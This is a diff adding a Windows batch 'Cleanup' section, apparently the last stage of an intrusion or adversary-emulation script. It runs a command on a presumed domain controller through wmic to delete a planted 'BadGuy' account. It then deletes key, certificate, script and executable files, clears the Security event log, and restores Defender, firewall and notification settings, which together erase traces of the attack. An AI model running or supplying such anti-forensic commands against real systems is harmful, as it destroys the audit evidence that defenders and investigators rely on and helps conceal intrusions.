@@ -1,0 +1,20 @@
+rem ** Cleanup
+wmic /node:"%mydc%" process call create "net user /delete BadGuy"
+del *.zip
+del *.txt
+del *.csv
+del *.log
+del *.xml
+del *.b64
+del *.ps1
+del *.mla
+del *.pvk
+del *.der
+del *.pfx
+del *.key
+del *.bat
+del *.exe
+powershell.exe -Command "Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" -Name ToastEnabled -Value 1 -Force"
+powershell.exe -Command "Clear-EventLog -LogName Security"
+powershell.exe -Command "Set-MpPreference -DisableBlockAtFirstSeen $false -DisableBehaviorMonitoring $false -DisableRealtimeMonitoring $false -DisableScriptScanning $false -EnableControlledFolderAccess Enabled -EnableNetworkProtection AuditMode -Force -SubmitSamplesConsent SendAllSamples -MAPSReporting Advanced -PUAProtection Enabled"
+netsh advfirewall set allprofiles state on
